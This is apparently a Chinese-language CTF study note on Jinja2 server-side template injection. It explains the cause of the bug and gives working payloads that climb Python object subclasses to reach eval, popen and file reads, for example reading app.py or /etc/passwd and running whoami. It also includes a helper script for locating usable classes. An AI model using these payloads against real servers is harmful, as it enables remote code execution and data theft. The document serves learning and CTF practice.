# SSTI--Jinja2

{{url_for.__globals__.__builtins__.eval('__import__("os").popen("cat app.py").read()')}}

{{config.__init__.__globals__. __builtins__.eval('__import__("os").popen("cat app.py").read()')}}

# 前言

SSTI（服务端模板注入），已然不再是一个新话题，近年来的CTF中还是也经常能遇到的，比如护网杯的easy_tonado、TWCTF的Shrine，19年的SCTF也出了Ruby ERB SSTI的考点；

本篇对这部分总结一下，方便未来做题和复习的时候查阅！

# 简介

首先简单说一下什么是SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；
漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。

## 利用流程

> 获取基本类->获取基本类的子类->在子类中找到关于命令执行和文件读写的模块

当然我们通常是找到`buildtins`在下面的基础上去进行一些骚操作，还有`catch_warnings.__init__.__globals__`也比较常用

## 构造链的思路

### 构造链的发现

- 第一步

目的：使用`__class__`来获取内置类所对应的类

可以通过使用`str`，`list`，`tuple`，`dict`等来获取

```
>>> ''.__class__
<class 'str'>
>>> "".__class__
<class 'str'>
>>> [].__class__
<class 'list'>
>>> ().__class__
<class 'tuple'>
>>> {}.__class__
<class 'dict'>
```

- 第二步

目的：拿到`object`基类

用`__bases__[0]`拿到基类或者`__base__`

```
Python 3.9.1
>>> {}.__class__.__bases__[0]
<class 'object'>
>>> {}.__class__.__base__
<class 'object'>
```

用`__mro__[1]`或者`__mro__[-1]`拿到基类

```
Python 3.9.1
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> ''.__class__.__mro__[-1]
<class 'object'>
```

- 第三步

用`__subclasses__()`拿到子类列表

```
Python 3.9.1
>>> ''.__class__.__bases__[0].__subclasses__()
[<class 'type'>, <class 'weakref'>,...]
```

- 第四步

在子类列表中找到可以加以利用的类

### 利用脚本帮助我们快速找到需要的模块

下面以python3为例，当然python2类似

```python
search = "popen"
num = -1
for i in ().__class__.__base__.__subclasses__():
	num += 1
	try:
		if search in i.__init__.__globals__.keys():
			print(i, num)
	except:
		pass
```

# Python当中的利用

## Python2当中的利用

tips：python2的`string`类型不直接从属于属于基类，所以要用两次 `__bases__[0]`

```
''.__class__.__bases__[0] <type 'basestring'>
''.__class__.__bases__[0].__bases__[0] <type 'object'>
```

- `file`类读写文件

本方法只能适用于python2，因为在python3中`file`类已经被移除了

```
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40] <type 'file'>

```

可以使用dir查看file对象中的内置方法

```
dir(''.__class__.__bases__[0].__bases__[0].__subclasses__()[40])

['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
```

然后直接调用里面的方法即可，payload如下

读文件

```
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/etc/passwd').read()
''.__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()
```

- warnings`类中的`linecache

  本方法只能用于python2，因为在python3中会报错`'function object' has no attribute 'func_globals'`，不知道为啥

## python3当中的利用

- `os._wrap_close`类中的`popen`

```
<class 'os._wrap_close'> 139
<class 'os._AddedDllDirectory'> 140

>>> "".__class__.__bases__[0].__subclasses__()[139].__init__.__globals__['popen']('whoami').read()
'desktop-v7cteor\\y4tacker\n'
().__class__.__base__.__subclasses__()[140].__init__.__globals__['popen']('whoami').read()
```

- `__import__`

  ```
  <class '_frozen_importlib._ModuleLock'> 80
  <class '_frozen_importlib._DummyModuleLock'> 81
  <class '_frozen_importlib._ModuleLockManager'> 82
  <class '_frozen_importlib.ModuleSpec'> 83
  {{"".__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__import__('os').popen('whoami').read()}}
  
  ```

# 常用魔法函数

```
__class__ 返回调用的参数类型
__bases__ 返回类型列表
__base__ 
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
__dict__ 查看对象内部所有属性名和属性值组成的字典
```



# 参考资料

作为 web层面的攻击,我们要关注语言层面的特性和绕过，在Flask/Jinja2 模板的语法,filters和内建函数,变量,都可能称为绕过的trick

[Jinja官方文档](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters)

[Flask官方文档](https://dormousehole.readthedocs.io/en/latest/)

[细说Jinja2之SSTI&bypass](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652868785&idx=1&sn=aea3849c8ee1cdc50ad0742744159800&chksm=bd59ec7c8a2e656a4f9f5b0753c6bef4efeae17ca9a5ab3d550fdac9b302adf3696c1c432eb1&mpshare=1&scene=23&srcid=1219HTr8L8YaCVw9dnE3xDUj&sharer_sharetime=1608375002321&sharer_shareid=39123bd44a937bb35fd979cc8098127f#rd)



## 注意

## 命令执行构造

在{{}}我们可以执行表达式,但是命名空间是受限的,没有builtins,所以eval,open这些操作是不能使用的,但根据前面的知识,我们可以通过任意一个函数的func_globals而得到他们的命名空间,而得到builtins

